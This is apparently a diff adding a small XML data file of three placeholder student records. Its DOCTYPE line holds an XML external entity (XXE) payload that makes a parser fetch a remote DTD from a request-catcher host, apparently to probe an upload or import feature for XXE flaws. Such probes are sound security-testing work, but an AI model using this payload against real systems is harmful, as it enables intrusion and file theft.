@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://test5xxe.free.beeceptor.com/test.dtd"> %xxe;]>
+<students>
+	<info>
+		<name>Name 1</name>
+		<birth>2000</birth>
+		<school>RHUST</school>
+	</info>
+	<info>
+		<name>Name 2</name>
+		<birth>2001</birth>
+		<school>RHUST</school>
+	</info>
+	<info>
+		<name>Name 3</name>
+		<birth>2002</birth>
+		<school>RHUST</school>
+	</info>
+</students>
